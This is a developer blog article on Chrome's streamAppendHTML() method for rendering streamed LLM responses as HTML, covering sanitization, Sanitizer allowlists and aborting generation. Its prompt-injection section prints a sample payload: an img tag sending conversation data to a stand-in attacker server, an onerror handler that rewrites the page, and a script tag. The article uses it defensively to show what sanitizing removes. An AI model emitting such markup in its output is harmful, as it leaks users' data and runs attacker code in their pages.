---
id: RZaaYUz0u8LaqF3LpDypY
title: "Streaming AI Responses as HTML with streamAppendHTML()"
slug: "stream-append-html"
about: "Reparsing the whole LLM response on every chunk recreates elements and loses state such as text selection. streamAppendHTML() returns a WritableStream that parses HTML onto the end of an element. This article covers its usage and sanitization."
createdAt: "2026-10-31T16:03+09:00"
updatedAt: "2026-10-31T16:03+09:00"
tags: ["HTML", "JavaScript"]
thumbnail:
  url: "https://images.ctfassets.net/in6v9lxmm5c8/nMV8Y5VNXt3Ifpp6rZBFJ/6e19e55d05d2d0c5022ce38f9f89cc3f/bike_big-scooter_15971-768x591.png"
  title: "Illustration of a big scooter"
audio: null
selfAssessment:
  quizzes:
    - question: "How does streamAppendHTML() behave when a chunk is cut off in the middle of a tag, as in <a hr?"
      answers:
        - text: "It temporarily displays the incomplete tag as text"
          correct: false
          explanation: "An incomplete tag is never displayed on screen as a string."
        - text: "It throws a TypeError and aborts the stream"
          correct: false
          explanation: "No exception is thrown even when a chunk ends in the middle of a tag."
        - text: "The caller must wait for the tag to complete before writing"
          correct: false
          explanation: "The parser holds on to the tag, so the caller doesn't need to wait."
        - text: "It holds the tag inside the parser and reflects it in the DOM once the tag is complete"
          correct: true
          explanation: "In testing, the a tag appeared in the DOM once the href value and the closing bracket had arrived."
    - question: "When using streamAppendHTMLUnsafe() with its default options, what happens if the LLM output contains a script element and an img element with an onerror attribute?"
      answers:
        - text: "The script element doesn't run, but onerror does"
          correct: true
          explanation: "The default runScripts value of false only prevents script elements from running, so onerror ran."
        - text: "Both the script element and onerror run"
          correct: false
          explanation: "The script element didn't run because runScripts defaults to false."
        - text: "The script element runs, but onerror doesn't"
          correct: false
          explanation: "It's the other way around. onerror is what ran."
        - text: "Both are removed and neither runs"
          correct: false
          explanation: "Removing them is what the safe version does. The unsafe version's sanitizer is disabled by default."
published: true
---

b> html-streaming-setters

Chat UIs that show an LLM's response little by little have to keep rendering an unfinished answer. The simplest implementation parses everything received so far on each chunk and replaces the element's contents. With this approach, the amount of reparsing grows as the response gets longer, and elements are recreated on every update. As a result, text selections are lost and a `<details>` element you opened snaps shut. That's why real-world chat UIs rely on Markdown libraries that avoid reprocessing the parts that are already finished.

[`streamAppendHTML()`](https://developer.chrome.com/blog/declarative-partial-updates) lets you hand part of this work to the browser. You can stream HTML as a string onto the end of an element, and elements that have already been rendered aren't recreated.

This article covers how to use `streamAppendHTML()` and how its sanitization behaves.

:::warning
As of my own testing on October 31, 2026, `streamAppendHTML()` works without a flag in Chrome 158 Beta and later. It wasn't available in Chrome 156. In Chrome and Edge 148 and later, you can try it by enabling `chrome://flags/#enable-experimental-web-platform-features`. Safari and Firefox don't support it.
:::

## What happens with the traditional implementation

The simplest way to render an LLM response incrementally looks like this: concatenate the incoming strings and set the whole thing on the element each time.

```js
let html = "";
await response.textStream().pipeTo(
  new WritableStream({
    write(chunk) {
      html += chunk;
      element.setHTML(html, { sanitizer });
    },
  }),
);
```

[`textStream()`](https://developer.mozilla.org/en-US/docs/Web/API/Response/textStream) is a method that reads the response body as a stream of strings. `setHTML()` is part of the [Sanitizer API](https://developer.mozilla.org/ja/docs/Web/API/HTML_Sanitizer_API), and it sanitizes HTML before replacing the element's contents.

Every time `write()` is called, this code reparses the response from the beginning and replaces all of the child elements. This causes the following problems:

- The longer the response gets, the longer the string parsed on each update
- State tied to elements, such as an open `<details>` or a text selection, is lost
- CSS animations restart from the beginning on every update

### Techniques used in real-world chat UIs

[Chrome's official guide](https://developer.chrome.com/docs/ai/render-llm-responses) also explains that assigning the accumulated full text to `innerHTML` is both unsafe and slow. Libraries used in real-world chat UIs assume Markdown responses and use techniques like these:

- Split the response into blocks and memoize them: [Streamdown](https://streamdown.ai/docs/memoization) keeps results per unit such as paragraphs and code blocks, and re-renders only the affected blocks when a token arrives
- Use a streaming-aware parser: [streaming-markdown](https://github.com/thetarnav/streaming-markdown) processes each chunk and only adds new elements, so it never changes elements that are already displayed
- Complete unfinished syntax: [remend](https://github.com/vercel/streamdown/tree/main/packages/remend), used by Streamdown, completes `**bold text` into `**bold text**` before rendering

In Markdown, a single `*` isn't enough to tell whether you're looking at a list or emphasis. streaming-markdown optimistically creates elements as soon as it sees a marker, and remend fills in the missing markers, so both can render in-between states.

`streamAppendHTML()` is an API where the browser's HTML parser takes care of holding tags until they're complete and adding elements. You can render without reprocessing the finished parts, and without any memoization mechanism.

:::note
You need the LLM to output HTML. If you handle responses as Markdown, the libraries above remain a good option.
:::

## The basics of `streamAppendHTML()`

`streamAppendHTML()` doesn't take an HTML string. Instead, it returns a [`WritableStream`](https://developer.mozilla.org/ja/docs/Web/API/WritableStream). When you connect a fetch response to this stream, HTML is parsed onto the end of the element as each chunk arrives.

```js
const response = await fetch("/api/answer");
await response.textStream().pipeTo(element.streamAppendHTML());
```

:::note
`response.body` is a stream of bytes, so don't connect it directly. Each `Uint8Array` gets converted to a string, and a series of numbers like `60,112,62` is rendered. With `textStream()`, you receive the body as UTF-8 text.
:::

:::info
Even if a chunk is cut off in the middle of a tag, as in `<a hr`, the caller doesn't need to wait. The parser holds on to it internally and reflects it in the DOM once the tag is complete. An incomplete tag is never displayed as a string.
:::

Besides `streamAppendHTML()`, there is a method for each insertion position.

| Insertion position | Safe version | Unsafe version |
| --- | --- | --- |
| Replace the contents | `streamHTML()` | `streamHTMLUnsafe()` |
| Replace the element itself | `streamReplaceWithHTML()` | `streamReplaceWithHTMLUnsafe()` |
| Insert immediately before | `streamBeforeHTML()` | `streamBeforeHTMLUnsafe()` |
| Insert as the first child | `streamPrependHTML()` | `streamPrependHTMLUnsafe()` |
| Insert as the last child | `streamAppendHTML()` | `streamAppendHTMLUnsafe()` |
| Insert immediately after | `streamAfterHTML()` | `streamAfterHTMLUnsafe()` |

The difference between the safe and unsafe versions is whether they sanitize. By default, the unsafe version doesn't sanitize and parses the HTML as is. The safe version sanitizes by default and removes elements and attributes that could lead to XSS attacks. Since a chat response is appended to the end of an existing element, this article uses `streamAppendHTML()`.

## Trying out rendering with `streamAppendHTML()`

Let's actually try rendering with `streamAppendHTML()`. For comparison, I also prepared the simplest implementation from earlier, which replaces everything with `setHTML()`. The following code fetches a response from `/api/answer` and renders it with `streamAppendHTML()`. The `sanitizer` setting is explained later.

```js
const response = await fetch("/api/answer");
await response.textStream().pipeTo(element.streamAppendHTML({ sanitizer }));
```

In the following video, a `<details>` element is opened partway through the response.

!v(https://videos.ctfassets.net/in6v9lxmm5c8/13N8j88u3IkZBKHgakzzLV/df40db1a5f2a0bdfb94af27678605139/stream-append-html-3.mp4 960x880)

Both versions display the response at the same speed, but in the `setHTML()` version the opened `<details>` closes on the next chunk. In the `streamAppendHTML()` version, the `<details>` stays open as more chunks arrive.

## Treat LLM output as untrusted input

Streaming rendering carries a risk: LLM output goes straight into the DOM. LLMs read search results, web pages, and documents attached by users as input. By following instructions embedded in those sources, an LLM may output malicious HTML. This attack is called prompt injection.

The following reproduces a case where an LLM, misled by external content, mixes this HTML into its response. The `<img>` URL includes information from the conversation and sends it to an attacker's server on a different origin. The attacker's server returns a 404, so `onerror` fires and rewrites the page's DOM.

```html
<p>検索結果を要約しました。来月の請求額は <strong>12,800 円</strong> です。</p>
<img
  src="http://localhost:3001/collect?memo=credit-card-ending-4242"
  onerror="document.querySelector('#unsafe').insertAdjacentHTML('beforebegin','<p class=hacked>このページで攻撃者のスクリプトが実行されました</p>')"
/>
<script>
  document.title = "pwned";
</script>
<p>ほかに確認したい項目はありますか？</p>
```

The left side renders the response with `streamAppendHTMLUnsafe()`, and the right side renders the same response with `streamAppendHTML()`.

!v(https://videos.ctfassets.net/in6v9lxmm5c8/5gvKwxo9DUlmzDeOCAATE2/dfb91855491f25850f49127aaed2df21/stream-append-html-4.mp4 960x360)

With `streamAppendHTML()`, the `<img>` and `<script>` are removed and only the text of the response is rendered. With `streamAppendHTMLUnsafe()`, on the other hand, the `<img>` is rendered, `onerror` runs, and the DOM gets rewritten.

Note that even in the `streamAppendHTMLUnsafe()` version, the `<script>` doesn't run. That's because the unsafe version's `runScripts` option defaults to `false`.

### What the default sanitizer removes

The safe version's `sanitizer` option defaults to `"default"`, which uses the configuration built into the browser. This configuration goes beyond preventing XSS and removes many elements and attributes through an allowlist. Here are the actual results I confirmed in Chrome 158 Beta and Chrome 159.

| Input | Result with the default sanitizer |
| --- | --- |
| `<img src="...">` | Entire element removed |
| `<details>`, `<summary>` | Entire element removed |
| `<div class="c" id="x" style="color:red">` | Attributes removed, leaving `<div>` |
| `<pre><code class="language-js">` | `class` removed |
| `<a href="https://example.com" target="_blank">` | `target` removed, `href` kept |
| `<a href="javascript:...">` | `href` removed |
| `<script>`, `<style>`, `<iframe>`, `<form>`, `<template>` | Entire element removed |
| `<table>`, `<h2>`, `<blockquote>` | Kept as is |

You can get the list of allowed elements and attributes by running `new Sanitizer().get()`.

```js
const sanitizer = new Sanitizer();
console.log(sanitizer.get());
// {
//   attributes: [...],
//   elements: [...],
//   comments: false,
//   dataAttributes: false,
//   processingInstructions: [],
// }
```

### Narrowing down the allowed elements

If you know which elements your chat responses use, listing them in a [`Sanitizer`](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer) reduces the elements available to an attacker. The comparison demo actually uses the following configuration. `<details>` is removed by default, so it's explicitly allowed here.

```js
const sanitizer = new Sanitizer({
  elements: [
    "h2", "h3", "p", "ul", "ol", "li", "pre", "code", "strong", "em",
    "blockquote", "details", "summary",
    { name: "a", attributes: ["href"] },
  ],
});

await response.textStream().pipeTo(element.streamAppendHTML({ sanitizer }));
```

The safe version won't let through anything that leads to XSS, even if the configuration allows it. For example, specifying `"script"` in `elements` still removes `<script>`.

:::warning
A sanitizer prevents XSS, not sending information to external servers. If you allow `src` on `<img>`, the request to that URL is still sent even with `onerror` removed. The `href` on `<a>` also stays as an external URL. If you allow images, restrict where they can load from with something like CSP's `img-src`.
:::

## Stopping response generation

A "Stop generating" button in a chat UI can be implemented with [`AbortController`](https://developer.mozilla.org/ja/docs/Web/API/AbortController). Pass the same `signal` to both `fetch()` and `pipeTo()`.

```js
const controller = new AbortController();
stopButton.addEventListener("click", () => controller.abort());

try {
  const response = await fetch("/api/answer", { signal: controller.signal });
  await response
    .textStream()
    .pipeTo(element.streamAppendHTML(), { signal: controller.signal });
} catch (error) {
  // Don't surface a user-initiated abort as an error
  if (error.name !== "AbortError") throw error;
}
```

When aborted, the `pipeTo()` promise rejects with an `AbortError`. When I aborted after receiving up to `<p>one<ul><li>two`, the DOM stayed at `<p>one</p><ul><li>two</li></ul>`, the same as before the abort. Even without closing tags, what has already been rendered doesn't break.

The following video shows clicking "Stop generating" partway through a response, which raises an `AbortError`. The rest of the response isn't rendered, but what was rendered so far stays in place.

!v(https://videos.ctfassets.net/in6v9lxmm5c8/ox95AtPyjpU3tzzpFT5Oh/c6eb95bbb250b2047e08eaddb30e81d4/stream-append-html-5.mp4 960x560)

## Summary

- `streamAppendHTML()` returns a `WritableStream`, and `response.textStream().pipeTo(element.streamAppendHTML())` incrementally parses HTML onto the end of an element
- Markdown libraries tackle the problems of full replacement with block memoization and streaming parsers, while with `streamAppendHTML()` the browser handles similar work for HTML
- The parser holds on to chunks cut off in the middle of a tag, so incomplete tags don't appear in the DOM
- LLM output is exposed to prompt injection, so treat it as untrusted input and render it with the safe version
- `streamAppendHTMLUnsafe()` doesn't sanitize by default, so event handler attributes such as `onerror` run. `<script>` doesn't run because `runScripts` defaults to `false`
- The default sanitizer also removes `<img>`, `<details>`, and `class`, so specify the elements you need in the `Sanitizer` allowlist

## References

- [declarative partial updates | Chrome for Developers](https://developer.chrome.com/blog/declarative-partial-updates)
- [Chrome 155 beta | Chrome for Developers](https://developer.chrome.com/blog/chrome-155-beta)
- [Best practices to render streamed LLM responses | Chrome for Developers](https://developer.chrome.com/docs/ai/render-llm-responses)
- [Memoization | Streamdown](https://streamdown.ai/docs/memoization)
- [thetarnav/streaming-markdown](https://github.com/thetarnav/streaming-markdown)
- [Dynamic markup revamped explainer](https://github.com/WICG/declarative-partial-updates/blob/main/dynamic-markup-revamped-explainer.md)
- [Add streaming HTML insertion methods - whatwg/html#12758](https://github.com/whatwg/html/pull/12758)
- [A way to stream content into an element - whatwg/html#2142](https://github.com/whatwg/html/issues/2142)
- [Coherent story for HTML-setting methods - whatwg/html#11669](https://github.com/whatwg/html/issues/11669)
- [Streaming sanitizer support - whatwg/html#12543](https://github.com/whatwg/html/issues/12543)
- [Intent to Ship: Renewed HTML insertion&streaming methods](https://www.mail-archive.com/blink-dev@chromium.org/msg16984.html)
